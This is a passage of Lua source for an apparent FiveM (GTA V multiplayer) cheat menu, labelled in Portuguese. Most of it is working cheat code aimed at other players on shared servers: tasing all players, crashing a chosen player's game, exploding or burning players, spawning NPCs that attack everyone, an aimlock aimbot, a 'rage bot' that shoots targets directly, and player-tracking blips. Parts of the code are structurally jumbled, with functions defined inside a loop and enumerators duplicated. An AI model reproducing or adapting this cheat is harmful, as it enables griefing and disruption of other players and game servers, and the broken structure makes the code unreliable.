        ClearPedTasks(PlayerPedId())
        for o, p in pairs(GetActivePlayers()) do
            local S = GetPlayerPed(p)
            local dW = GetEntityCoords(S)
            local dX = GetPedBoneCoords(S, 0, 0.0, 0.0, 0.0)
            local dY = GetPedBoneCoords(S, 57005, 0.0, 0.0, 0.2)
            if S ~= PlayerPedId() and not IsPedDeadOrDying(S) then
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                Citizen.Wait(100)
            end
        end
    end
    elseif tab == "slamn1" then
        vitolasRPMQCUeMEUCUuu(0.595,0.275,0.039,0.0015,0, 0, 255,255)
        if manacokkk("",admgordolas,0.387,0.35) then
        end

        if Subbutao("Players", "Voltar",vitolasRPMQCUeMEUCUzz,0.387,0.349) then
            tab = "Players"
        
        end

    elseif tab == "slamn" then
        vitolasRPMQCUeMEUCUuu(0.595,0.275,0.039,0.0015,0, 0, 255,255)
        --vitolasRPMQCUeMEUCUuu(0.5, 0.5, 0.38, 0.53, 40, 40, 40, 255)
    
        vitolasRPMQCUeMEUCUuu(0.78, 0.5, 0.15, 0.53,0, 0, 0, 250) -- PLAYER LIST
        vitolasRPMQCUeMEUCUuu(0.78, 0.243, 0.15, 0.015, 0, 0, 255, 255) -- tab lateral
        
        local ypos2 = 0.008
    
    
    
        local playerlist = GetActivePlayers()
        local hash = GetEntityModel(GetPlayerPed(SelectedPlayer))
        local lmao = "M"
        if hash == `mp_f_freemode_01` then
            lmao = "F"
        elseif hash == `mp_f_freemode_01` then
            lmao = "M"
        else
            lmao = "N"
        end
        if SelectedPlayer == vitolasRPMQCUeMEUCUss then
            SelectedPlayer = playerlist[1]
        end
        if #GetActivePlayers() >= 30 then
            if IsDisabledControlJustPressed(0, 15) then
                ypos2 = ypos2 + 0.015
            end
            if IsDisabledControlJustPressed(0, 14) then
                ypos2 = ypos2 - 0.015
            end
        end
        for i = 1, #playerlist do
            local currPlayer = playerlist[i]
            local buttonypos = ((0.26 * 1.0) + (i - 1) * 0.02) + ypos2
            if buttonypos >= 0.26 and buttonypos <= 0.7125 then
                local player = admgordolas
                if SelectedPlayer == currPlayer then
                    SetTextColour(corzinhadomeni.r, corzinhadomeni.g, corzinhadomeni.b, 255)
                    player = ' ~p~>~w~ '..GetPlayerName(currPlayer)
                else
                    
                    player = ' ~r~>~w~ '..GetPlayerName(currPlayer)
                end
                if Playermanacokkks(player, 0.601, buttonypos, admgordolas) then
                    SelectedPlayer = currPlayer
                end
            --print(buttonypos)
            end
        end

        if manacokkk("",admgordolas,0.387,0.35) then
        end

        if Subbutao("Players", "Voltar",vitolasRPMQCUeMEUCUzz,0.387,0.349) then
            tab = "Players"
        
        end
        
        if manacokkk("Copiar Roupa",admgordolas,0.387,0.40) then
            ClonePed()
            ShowInfo("[~h~~r~V~p~I~y~T~r~O~b~R~g~ - ~h~~r~M~p~E~y~N~b~U~w~] ~w~Skin Copiada")
        end

        if manacokkk("Comer Player",admgordolas,0.387,0.45) then
            VeioTaradoVitolasMelhorMonster()
        end

        if manacokkk("Cargoplane",admgordolas,0.387,0.50) then
            GetRamedByVehicle('cargoplane',SelectedPlayer)
        end

        if manacokkk("Bugar veiculo",admgordolas,0.387,0.55) then
            BugarVeiculoRP()
        end

        if manacokkk("Deletar Veiculo",admgordolas,0.387,0.60) then
            deletarVeiculoPlayer()
        end

        if manacokkk("TP Player ~r~[!]",admgordolas,0.387,0.65) then
            TPPlayer()
        end

        if manacokkk("Explodir",admgordolas,0.387,0.70) then
            ExplodirPlayerRP()
        end  

        if manacokkk("Taze Player ~r~[!]",admgordolas,0.5,0.350) then
            TazerPlayerRP()
        end
            
        if manacokkk("Caixão Player ~r~[!]",admgordolas,0.5,0.40) then
            CaixaoPlayerKK()
        end

        if manacokkk("NPC com Faca ~r~[!]",admgordolas,0.615,0.35) then
            NPC_FACA()
        end  

        if manacokkk("NPC com Rifle ~r~[!]",admgordolas,0.615,0.40) then
            NPC_RIFLE()
        end

        if manacokkk("NPC Rifle Explosivo ~r~[!]",admgordolas,0.615,0.45) then
            NPC_RIFLE_EXPLODE()
        end    


        if manacokkk("NPC Rifle Laser ~r~[!]",admgordolas,0.615,0.50) then
            NPC_RIFLE_LASER()
        end

        if manacokkk("Peixe No Bumbum ~r~[!]", admgordolas, 0.615,0.55) then
            PeixeNoBumbumKKK()
        end

        if manacokkk("Crashar Player ~r~[!]", admgordolas, 0.615,0.60) then
            CrashPlayerVitolas()
        end

        if manacokkk("BMX Player ~r~[!]", admgordolas, 0.615,0.65) then
            bicosabmxx()
        end

        if manacokkk("NPC Carro Seguindo ~r~[!]",admgordolas,0.5,0.45) then
            CARRO_SEGUINDO()
        end

        if manacokkk("NPC com Tazer ~r~[!]",admgordolas,0.5,0.50) then
            NPC_TAZER()
        end

    if manacokkk("Explosão Invisivel ~r~[!]",admgordolas,0.5,0.60) then
        ExplosaoInvisivel()
    end

    if manacokkk("Curar Player", admgordolas, 0.5,0.65) then

        CurarPlayerRP()
    end

    if manacokkk("Dar Todas Armas", admgordolas, 0.5,0.70) then
        AllArmasPlayer()
    end

    if manacokkk("Molotov no Jogador ~r~[!]",admgordolas,0.5,0.55) then
       MolotovPlayerVitolasRP()
    end
end

    local x, y = GetNuiCursorPosition()
    local x_ez, y_ez = GetActiveScreenResolution()
    local cursorX, cursorY = x / x_ez, y / y_ez
    meucuuuuuuu(Mouse(admgordolas).x - 2, Mouse(admgordolas).y - 7, 3, 13, 0, 0, 0, 255)
    meucuuuuuuu(Mouse(admgordolas).x - 7, Mouse(admgordolas).y - 2, 13, 3, 0, 0, 0, 255)
    meucuuuuuuu(Mouse(admgordolas).x - 1, Mouse(admgordolas).y - 6, 1, 11, 255, 255, 255, 255)
    meucuuuuuuu(Mouse(admgordolas).x - 6, Mouse(admgordolas).y - 1, 11, 1, 255, 255, 255, 255)
end



function meni()
    ----------- MAIN ---------- 
 
 
    --------MENU---------
    SetMouseCursorSprite(1)
    local ip = GetCurrentServerEndpoint()
    local year, month, day, hour, minute, second = GetUtcTime()
    vitolasRPMQCUeMEUCUyy("                            ~h~~r~V~p~i~y~t~r~o~b~r~g~ - ~h~~r~M~p~e~y~n~b~u",0.390,0.29,vitolasRPMQCUeMEUCUzz,0.3,10,admgordolas)
    vitolasRPMQCUeMEUCUyy("by: ~r~V~p~i~y~t~r~o~b~r~g~ - ~h~~r~M~p~e~y~n~b~u",0.278,0.74,vitolasRPMQCUeMEUCUzz,0.3,10,admgordolas)
    vitolasRPMQCUeMEUCUyy("",0.315,0.74,vitolasRPMQCUeMEUCUzz,0.3,10,admgordolas)
    local ip = GetCurrentServerEndpoint()
    vitolasRPMQCUeMEUCUuu(0.5, 0.5, 0.45, 0.53, 0, 0, 0, 220) -- dul
    vitolasRPMQCUeMEUCUuu(0.3101, 0.5, 0.001, 0.53, 255, 0, 0, 0) -- Actions Box Line (Left)
    vitolasRPMQCUeMEUCUuu(0.69, 0.5, 0.001, 0.53, 255, 0, 0, 0) -- Actions Box Line (Right)
    vitolasRPMQCUeMEUCUuu(0.5, 0.2363, 0.45, 0.002, 255, 0, 0, 0) -- Actions Box Line2 (Top)
    vitolasRPMQCUeMEUCUuu(0.5, 0.765, 0.45, 0.002, 255, 0, 0, 255) -- Actions Box Line (Bottom)

    vitolasRPMQCUeMEUCUuu(0.325, 0.5133, 0.001, 0.45, 255, 0, 0, 0) -- Actions Box Line (Left)
    vitolasRPMQCUeMEUCUuu(0.675, 0.5133, 0.001, 0.45, 255, 0, 0, 0) -- Actions Box Line (Right)
    vitolasRPMQCUeMEUCUuu(0.5, 0.2879, 0.43, 0.002, 255, 0, 0, 0) -- Actions Box Line2 (Top)
    vitolasRPMQCUeMEUCUuu(0.5, 0.3183, 0.25, 0.002, 255, 0, 0, 255) -- Actions Box Line3 (Bottom)
    vitolasRPMQCUeMEUCUuu(0.5, 0.737, 0.43, 0.002, 0, 0, 255, 0) -- Actions Box Line (Bottom)
    LeftBar()
    tabs()
end

function ReviverRP()
        SetEntityHealth(PlayerPedId(), 400)
        ClearPedBloodDamage(PlayerPedId())
        ClearPedWetness(PlayerPedId())
        ClearPedEnvDirt(PlayerPedId())
end

function SuicidioRP()
    SetEntityHealth(PlayerPedId(), 0)
end

function maisVidaRP()
    SetEntityHealth(PlayerPedId(), 400)
end


function RamdomRoupaRP()
    RandomSkin(PlayerId())
end

function FPS_ON()
        SetTimecycleModifier("cinema")
        RopeDrawShadowEnabled(false)
        CascadeShadowsClearShadowSampleType()
        CascadeShadowsSetAircraftMode(false)
        CascadeShadowsEnableEntityTracker(true)
        CascadeShadowsSetDynamicDepthMode(false)
        CascadeShadowsSetEntityTrackerScale(0.0)
        CascadeShadowsSetDynamicDepthValue(0.0)
        CascadeShadowsSetCascadeBoundsScale(0.0)
        SetFlashLightFadeDistance(0.0)
        SetLightsCutoffDistanceTweak(0.0)
        DistantCopCarSirens(false)
end

function FPS_OFF()
    SetTimecycleModifier("default")
end

function DrawTextB(text, x, y, _outl, size, font, centre) 
    SetTextFont(0) 
    if _outl then 
        SetTextOutline(true) 
    end 
    if tonumber(font) ~= nil then 
        SetTextFont(font) 
    end 
    SetTextCentre(centre) 
    SetTextScale(100.0, size or 0.23) 
    BeginTextCommandDisplayText("STRING") 
    AddTextComponentSubstringWebsite(text) 
    EndTextCommandDisplayText(x, y) 
end

if sdfijsdfjidfsjinm then
    if not Displayed then
        local camera = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
        RenderScriptCams(admgordolas, admgordolas, 700, 1, 1)
        SetCamActive(camera, admgordolas)
        SetCamCoord(camera, GetGameplayCamCoord())
        local offsetRotX = GetGameplayCamRot(2).x
        local offsetRotY = GetGameplayCamRot(2).y
        local offsetRotZ = GetGameplayCamRot(2).z
        
        
        while DoesCamExist(camera) do
            Wait(0)
            DisableControlAction(0, 1, admgordolas)
            DisableControlAction(0, 2, admgordolas)
            DisableControlAction(0, 142, admgordolas)
            DisableControlAction(0, 18, admgordolas)
            DisableControlAction(0, 322, admgordolas)
            DisableControlAction(0, 106, admgordolas)
            DisableControlAction(0, 24, admgordolas)
            DisableControlAction(0, 25, admgordolas)
            DisableControlAction(0, 1, admgordolas)
            DisableControlAction(0, 2, admgordolas)
            DisableControlAction(0, 24, admgordolas)
            DisableControlAction(0, 69, admgordolas)
            DisableControlAction(0, 142, admgordolas)
            DisableControlAction(0, 257, admgordolas)
            DisableControlAction(0, 25, admgordolas)
            DisableControlAction(0, 17, admgordolas)
            DisableControlAction(0, 16, admgordolas)
            DisableControlAction(0, 200, admgordolas)
            DisableControlAction(0, 85, admgordolas)
            DisableControlAction(0, 99, admgordolas)
            DisableControlAction(0, 92, admgordolas)
            local currentmode = sdfijsdfjidfsjin.modes[sdfijsdfjidfsjin.mode]
            local camera_rot = GetCamRot(camera, 2)
            local coords = GetCamCoord(camera)
            local adjustedRotation = {x = (ansdoiadaoid.pi / 180) * GetCamRot(camera,0).x, y = (ansdoiadaoid.pi / 180) * GetCamRot(camera,0).y, z = (ansdoiadaoid.pi / 180) * GetCamRot(camera,0).z 	}	
            local direction = {x = - ansdoiadaoid.sin(adjustedRotation.z) * ansdoiadaoid.abs(ansdoiadaoid.cos(adjustedRotation.x)), y = ansdoiadaoid.cos(adjustedRotation.z) * ansdoiadaoid.abs(ansdoiadaoid.cos(adjustedRotation.x)), z = ansdoiadaoid.sin(adjustedRotation.x)}	
            local cameraRotation = GetCamRot(camera,0)
            local cameraCoord = GetCamCoord(camera)	
            local distance = 5000.0
            local destination = {x = cameraCoord.x + direction.x * distance, y = cameraCoord.y + direction.y * distance, z = cameraCoord.z + direction.z * distance}	
            local a, b, coords, d, entity = GetShapeTestResult(StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, -1, 1))
            SetCamFov(camera, Sliders['player-sdfijsdfjidfsjin-fov'].value)
            
            -------------------------------------------------------------------------------------------------------------------------------------------------
            if not sdfijsdfjidfsjinm then
                DestroyCam(camera, sdhiufhuifsdhuf)
                ClearTimecycleModifier()
                RenderScriptCams(sdhiufhuifsdhuf, admgordolas, 700, 1, 0)
                FreezeEntityPosition(asodjadaoidadadad(), sdhiufhuifsdhuf)
                SetFocusEntity(asodjadaoidadadad())
                break;
            end
            if not Displayed then
                local playerPed = asodjadaoidadadad()
                local playerRot = GetEntityRotation(playerPed, 2)

        
                local rotX = playerRot.x
                local rotY = playerRot.y
                local rotZ = playerRot.z
        
                offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * Sliders['player-sdfijsdfjidfsjin-sensitivity'].value)
                offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * Sliders['player-sdfijsdfjidfsjin-sensitivity'].value)
        
                if (offsetRotX > 90.0) then 
                    offsetRotX = 90.0 
                elseif (offsetRotX < -90.0) then 
                    offsetRotX = -90.0 
                end
        
                if (offsetRotY > 90.0) then 
                    offsetRotY = 90.0 
                elseif (offsetRotY < -90.0) then 
                    offsetRotY = -90.0 
                end
        
                if (offsetRotZ > 360.0) then 
                    offsetRotZ = offsetRotZ - 360.0 
                elseif (offsetRotZ < -360.0) then 
                    offsetRotZ = offsetRotZ + 360.0 
                end

                local x, y, z = table.unpack(GetCamCoord(camera))
                local Vector = vector3(x, y, z)
                local vecX, vecY, vecZ = GetCamMatrix(camera)
                local CurrentSpeed = Sliders['player-sdfijsdfjidfsjin-speed'].value

                if IsDisabledControlPressed(1, 36) then 
                    CurrentSpeed = CurrentSpeed / 15 
                end

                if IsDisabledControlPressed(1, 21) then 
                    CurrentSpeed = CurrentSpeed * 3 
                end

                if IsDisabledControlPressed(1, 32) then  
                    SetCamCoord(camera, GetCamCoord(camera) + (RotationToDirection(GetCamRot(camera, 2)) * ((CurrentSpeed))))
                elseif IsDisabledControlPressed(1, 33) then 
                    SetCamCoord(camera, GetCamCoord(camera) - (RotationToDirection(GetCamRot(camera, 2)) * ((CurrentSpeed))))
                elseif IsDisabledControlPressed(1, 22) then 
                    SetCamCoord(camera, x, y, z + (CurrentSpeed))
                elseif IsDisabledControlPressed(1, 73) then 
                    SetCamCoord(camera, x, y, z - (CurrentSpeed))
                elseif IsDisabledControlPressed(1, 34) then 
                    Vector = Vector - vecX * (CurrentSpeed) 
                    SetCamCoord(camera, Vector, y, z)
                elseif IsDisabledControlPressed(1, 9) then 
                    Vector = Vector + vecX * (CurrentSpeed) 
                    SetCamCoord(camera, Vector, y, z) 
                end  

                local cx, cy, cz = string.format('%.'.. 1 ..'f', coords.x), string.format('%.'.. 1 ..'f', coords.y), string.format('%.'.. 1 ..'f', coords.z)
                local resX, resY = GetActiveScreenResolution()
                hiujdsaiuhsdaihudas(0.5, 0.5, 0.009, 3/resY, 0, 0, 0, 255)
                hiujdsaiuhsdaihudas(0.5, 0.5, 3/resX, 0.009*1.8, 0, 0, 0, 255)
                hiujdsaiuhsdaihudas(0.5, 0.5, 0.008, 1/resY, 255, 255, 255, 255)
                hiujdsaiuhsdaihudas(0.5, 0.5, 1/resX, 0.008*1.8, 255, 255, 255, 255)


                if currentmode == 'Visualizar' then
                    DisableControlAction(0, 32, admgordolas) -- W
                    DisableControlAction(0, 31, admgordolas) -- S
                    DisableControlAction(0, 30, admgordolas) -- D
                    DisableControlAction(0, 34, admgordolas) -- A
                    DisableControlAction(0, 71, admgordolas) -- W
                    DisableControlAction(0, 72, admgordolas) -- S
                    DisableControlAction(0, 63, admgordolas) -- D
                    DisableControlAction(0, 64, admgordolas) -- A
                end

                if currentmode == 'Ped Spawner' then
                    DisableControlAction(0, 32, admgordolas) -- W
                    DisableControlAction(0, 31, admgordolas) -- S
                    DisableControlAction(0, 30, admgordolas) -- D
                    DisableControlAction(0, 34, admgordolas) -- A
                    DisableControlAction(0, 71, admgordolas) -- W
                    DisableControlAction(0, 72, admgordolas) -- S
                    DisableControlAction(0, 63, admgordolas) -- D
                    DisableControlAction(0, 64, admgordolas) -- A
                    armapeed = {'weapon_carbinerifle'}
                    local armaped = (armapeed[ansdoiadaoid.random(#armapeed)])
                    if coords ~= vector3(0, 0, 0) and not DisplayMenu then 		
                            if IsDisabledControlJustPressed(0, 69) then 
                                local pedtable = {'csb_ramp_gang','g_m_importexport_01','g_m_y_famca_01',}
                                local randomPed = (pedtable[ansdoiadaoid.random(#pedtable)])
                                if not HasModelLoaded(sapdadaodja(randomPed)) then 
                                    RequestModel(sapdadaodja(randomPed))
                                end 										
                                Wait(5)
                                    local ped = CreatePed(3, sapdadaodja(randomPed),coords.x,coords.y,coords.z - 0.5,admgordolas,admgordolas)
                                    sdufbsyufbsyfd(ped, sapdadaodja(armaped), 200, 1, 1)
                                    for k, i in pairs(GetActivePlayers()) do 
                                        TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

function text(nazwa,outline,size,Justification,xx,yy, centre, font)

    if outline then
        SetTextOutline()
    end
    if font ~= nil and tonumber(font) ~= nil then
    SetTextFont(2)
    else
    SetTextFont(2)
    end

    if centre then
        SetTextCentre(true)
    end
    
    SetTextProportional(1)
    SetTextScale(100.0, size)
    SetTextEdge(1, 0, 0,227,255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa)
    EndTextCommandDisplayText(xx, yy)

end

function BindDoMenu()
    local klikniete = nil
    local DisplayMenu = false
    local napis = nil
    local zbindowane = false
    while not zbindowane do
        Wait(0)
        DrawTextB('Clique na Tecla', 0.475, 0.495, true, 0.4, 4, false)
        DrawRect(0.5, 0.51, 0.126, 0.037, 255, 0, 0, 255) 
        DrawRect(0.5, 0.51, 0.125, 0.035, 0, 0, 0, 255)
        for k, v in pairs(keys) do
            if IsDisabledControlPressed(0, v) then
                klikniete = v
                napis = k
            end
        end
        if klikniete ~= nil then
            local DisplayMenu = true
            zbindowane = true
            return klikniete, napis 
        end
    end
end
    

local function AddVectors(one, two)
    return vector3(one.x + two.x, one.y + two.y, one.z + two.z)
end

if aimlock then
    for dh in EnumeratePeds() do
        local di = GetPedBoneCoords(dh, 31086)
        R = IsPedAPlayer(dh)
        local x, y, z = table.unpack(GetEntityCoords(dh))
        local aj, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
        local dj = visuals_aimlock.value
        local dk, dl = GetFinalRenderedCamCoord(), GetEntityRotation(PlayerPedId(), 2)
        local dm, dn, dp = (di - dk).x, (di - dk).y, (di - dk).z
        local dq, bo, dr =
            -math.deg(math.atan2(dm, dn)) - dl.z,
            math.deg(math.atan2(dp, #vector3(dm, dn, 0.0))),
            1.0
        local dq = lerp(1.0, 0.0, dq)
        if dh ~= PlayerPedId() and IsEntityOnScreen(dh) and R then
            if _x > 0.5 - dj / 2 and _x < 0.5 + dj / 2 and _y > 0.5 - dj / 2 and _y < 0.5 + dj / 2 then
                if IsDisabledControlPressed(0, 25) and IsDisabledControlPressed(0, 25) then
                    if HasEntityClearLosToEntity(PlayerPedId(), dh, 19) then
                        if IsEntityDead(dh) then
                        else
                            SetGameplayCamRelativeRotation(dq, bo, dr)
                        end
                    end
                end
            end
        end
    end
end
if aimlock then
    for dh in EnumeratePeds() do
        local di = GetPedBoneCoords(dh, 31086)
        R = dh
        local x, y, z = table.unpack(GetEntityCoords(dh))
        local aj, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
        local dj = visuals_aimlock.value + 0.0
        local dk, dl = GetFinalRenderedCamCoord(), GetEntityRotation(PlayerPedId(), 2)
        local dm, dn, dp = (di - dk).x, (di - dk).y, (di - dk).z
        local dq, bo, dr =
            -math.deg(math.atan2(dm, dn)) - dl.z,
            math.deg(math.atan2(dp, #vector3(dm, dn, 0.0))),
            1.0
        local dq = lerp(1.0, 0.0, dq)
        if not IsPedAPlayer(dh) and dh ~= PlayerPedId() and IsEntityOnScreen(dh) and R then
            if _x > 0.5 - dj / 2 and _x < 0.5 + dj / 2 and _y > 0.5 - dj / 2 and _y < 0.5 + dj / 2 then
                if IsDisabledControlPressed(0, 25) and IsDisabledControlPressed(0, 25) then
                    if HasEntityClearLosToEntity(PlayerPedId(), dh, 19) then
                        if IsEntityDead(dh) then
                        else
                            SetGameplayCamRelativeRotation(dq, bo, dr)
                        end
                    end
                end
            end
        end
    end
end

if aimlock then
    RequestStreamedTextureDict('mpmissmarkers256', 1)
    DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, visuals_aimlock.value + 0.0,visuals_aimlock.value + 0.0 * 1.8 ,0.0,0,0,0,80)
end

local function rage_bot_shoot(target, damage)
    local boneTarget = GetPedBoneCoords(target, 0x796E, 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(Citizen.InvokeNative(0xD80958FC74E988A6))
    Citizen.InvokeNative(0x867654CBC7606F2C, AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, vitolasRPMQCUeMEUCUzz, weapon, 0, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, 1000.0)
end


local function rage_bot(lol, player)
    if not Citizen.InvokeNative(0x3317DEDB88C95038, player) then
        local _, weapon = GetCurrentPedWeapon(Citizen.InvokeNative(0xD80958FC74E988A6))
        if not player == PlayerPedId() and not Friends[lol] then
            rage_bot_shoot(player, GetWeaponDamage(weapon, 1))
        end
    end
end

if blips then
    local plist = GetActivePlayers()
    for i = 1, #plist do
        local id = plist[i]
        local ped = GetPlayerPed(id)
        if ped ~= PlayerPedId() then
            local playerblip = GetBlipFromEntity(ped)
            if not DoesBlipExist(playerblip) then
                playerblip = AddBlipForEntity(ped)
                SetBlipSprite(playerblip, 126)
                ShowHeadingIndicatorOnBlip(playerblip, vitolasRPMQCUeMEUCUzz)
                SetBlipNameToPlayerName(playerblip, id)
                SetBlipScale(playerblip, 0.80)
                SetBlipColour(playerblip, 49)
            else
                local vehicle = GetVehiclePedIsIn(ped, admgordolas)
                local blipshit = GetBlipSprite(playerblip)
                local model = GetEntityModel(vehicle)
                if GetEntityHealth(ped) == 0 then
                    if blipshit ~= 429 then
                        SetBlipSprite(playerblip, 429)
                        SetBlipColour(playerblip, 37)
                        ShowHeadingIndicatorOnBlip(playerblip, vitolasRPMQCUeMEUCUzz)
                        SetBlipScale(playerblip, 0.80)
                    end
                elseif vehicle then
                    local blippd = GetBlipSprite(playerblip)
                    local vehiclehash = GetVehicleClass(vehicle)
                    if
                        vehiclehash == vitolasRPMQCUeMEUCUff("police") or model == vitolasRPMQCUeMEUCUff("police2") or
                            model == vitolasRPMQCUeMEUCUff("police3") or
                            model == vitolasRPMQCUeMEUCUff("sheriff2") or
                            model == vitolasRPMQCUeMEUCUff("sheriff") or
                            model == vitolasRPMQCUeMEUCUff("policeold2") or
                            model == vitolasRPMQCUeMEUCUff("fbi") or
                            model == vitolasRPMQCUeMEUCUff("fbi2")
                     then
                        if blippd ~= 60 then
                            SetBlipSprite(playerblip, 60)
                            SetBlipColour(playerblip, 26)
                            SetBlipScale(playerblip, 0.80)
                            ShowHeadingIndicatorOnBlip(playerblip, vitolasRPMQCUeMEUCUzz)
                        end
                        if IsPauseMenuActive() then
                            SetBlipAlpha(playerblip, 255)
                        else
                            local x1, y1 = (GetEntityCoords(PlayerPedId(), vitolasRPMQCUeMEUCUzz))
                            local x2, y2 = (GetEntityCoords(GetPlayerPed(id), vitolasRPMQCUeMEUCUzz))
                            local distance = (((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2)) / -1) + 900
                            if distance < 0 then
                                distance = 0
                            elseif distance > 255 then
                                distance = 255
                            end
                            SetBlipAlpha(playerblip, distance)
                            SetBlipRotation(playerblip, (GetEntityHeading(vehicle)))
                        end
                    end
                end
            end
        end
    end
elseif not blips then
    local plist = GetActivePlayers()
    for i = 1, #plist do
        local id = plist[i]
        local ped = GetPlayerPed(id)
        local playerblip = GetBlipFromEntity(ped)
        local playerblipDead = GetBlipFromEntity(ped)
        local playerblipPolice = GetBlipFromEntity(ped)
        if DoesBlipExist(playerblip) then
            RemoveBlip(playerblip)
        end
    end
end

local function RGBRainbow(frequency)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = admmeupau.floor(admmeupau.sin(curtime * frequency + 0) * 127 + 128)
    result.g = admmeupau.floor(admmeupau.sin(curtime * frequency + 2) * 127 + 128)
    result.b = admmeupau.floor(admmeupau.sin(curtime * frequency + 4) * 127 + 128)

    return result
end

local function bX(bY, bZ, b_)
    return coroutine.wrap(
        function()
            local c0, c1 = bY()
            if not c1 or c1 == 0 then
                b_(c0)
                return
            end
            local c2 = {handle = c0, destructor = b_}
            setmetatable(c2, entityEnumerator)
            local c3 = vitolasRPMQCUeMEUCUzz
            repeat
                coroutine.yield(c1)
                c3, c1 = bZ(c0)
            until not c3
            c2.destructor, c2.handle = vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss
            b_(c0)
        end
    )
end
function EnumeratePeds()
    return bX(FindFirstPed, FindNextPed, EndFindPed)
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    local x = -admmeupau.sin(heading * admmeupau.pi / 180.0)
    local y = admmeupau.cos(heading * admmeupau.pi / 180.0)
    local z = admmeupau.sin(pitch * admmeupau.pi / 180.0)
    local len = admmeupau.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    return x, y, z
end
function lerp(n, o, p)
    if n > 1 then
        return p
    end
    if n < 0 then
        return o
    end
    return o + (p - o) * n
end
function GetSeatPedIsIn(ped)
    if not IsPedInAnyVehicle(ped, zickaa) then
        return
    else
        veh = GetVehiclePedIsIn(ped)
        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if GetPedInVehicleSeat(veh) then
                return i
            end
        end
    end
end

function SetarRGVitolas()
    local rg = KeyInput("~p~Seu ~w~Rg", "", 8)
    if rg then
        registro2 = rg
        SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), rg)
        ShowInfo('[~r~V~p~I~y~T~r~O~b~R~g~ - ~h~~r~M~p~E~y~N~b~U~w~]  ~w~RG Setado', vitolasRPMQCUeMEUCUzz)
    end
end

function spawnCarRP()
    if registro2 then
        local veiculoo = KeyInput("~p~Nome do ~w~Veiculo", "", 25)
        if veiculoo and IsModelValid(veiculoo) and IsModelAVehicle(veiculoo) then
            RequestModel(veiculoo)
            while not HasModelLoaded(veiculoo) do
                Wait(0)
            end
            local coords = GetEntityCoords(PlayerPedId())
            local xf = GetEntityForwardX(PlayerPedId())
            local yf = GetEntityForwardY(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())
            local veh =
            CreateVehicle(GetHashKey(veiculoo), coords.x + xf * 3, coords.y + yf * 3, coords.z, heading, 1, 1)
            SetPedIntoVehicle(PlayerPedId(), veh, -1) 
            SetVehicleNumberPlateText(veh, registro2)
            ShowInfo('[~h~~r~V~p~I~y~T~r~O~b~R~g~ - ~h~~r~M~p~E~y~N~b~U~w~]  ~w~Veiculo Spawnado', vitolasRPMQCUeMEUCUzz)
    end
else
    ShowInfo('[~h~~r~V~p~I~y~T~r~O~b~R~g~ - ~h~~r~M~p~E~y~N~b~U~w~]  ~w~Sete o RG Primeiro', vitolasRPMQCUeMEUCUzz)
end
end

Citizen.CreateThread(function()
    
    while MenuEnabled do
        vitolasRPMQCUeMEUCUtt(0)
        if munizinha then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                AddExplosion(pos.x, pos.y, pos.z, 29, 1.0, 1, 0, 0.1)
            end
        end

        if munizinhadeshock then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
            AddExplosion(pos.x, pos.y, pos.z, 70, 1.0, 1, 0, 0.1)
            end
        end

        if VehicleRGB then
            ra = RGBRainbow(1.3)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
        end

        if vehInv then 
            SetEntityVisible(GetVehiclePedIsIn(GetPlayerPed(-1), false), false, false)
        else
            SetEntityVisible(GetVehiclePedIsIn(GetPlayerPed(-1), false), true, false)
        end

        if deletenearestvehicle then
            for dR in cw() do
                NetworkRequestControlOfEntity(dR)
                DeleteEntity(dR)
                end
                end
                local function co(cp, cq, cr)
                return coroutine.wrap(
                function()
                local cs, ct = cp()
                if not ct or ct == 0 then
                cr(cs)
                return
                end
                local cu = {handle = cs, destructor = cr}
                setmetatable(cu, entityEnumerator)
                local cv = sjdghjdfhgikaojgr
                repeat
                coroutine.yield(ct)
                cv, ct = cq(cs)
                until not cv
                cu.destructor, cu.handle = zcmbidosdvjh, zcmbidosdvjh
                cr(cs)
                end
                )
                end
                function cw()
                return co(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
                end
                function EnumeratePeds()
                return co(FindFirstPed, FindNextPed, EndFindPed)
                end
                local function cw()
                return co(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
                end
                local function cx()
                return co(FindFirstObject, FindNextObject, EndFindObject)
                end

        if FlyingCars then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
        end
            
        if esps_gaymerskkk then
            ra = RGBRainbow(1.3)
            esp_box_cor = {r = ra.r, g = ra.b, b = ra.g}
            esp_skel_cor = {r = ra.r, g = ra.b, b = ra.g}
            esp_nome_cor = {r = ra.r, g = ra.b, b = ra.g}
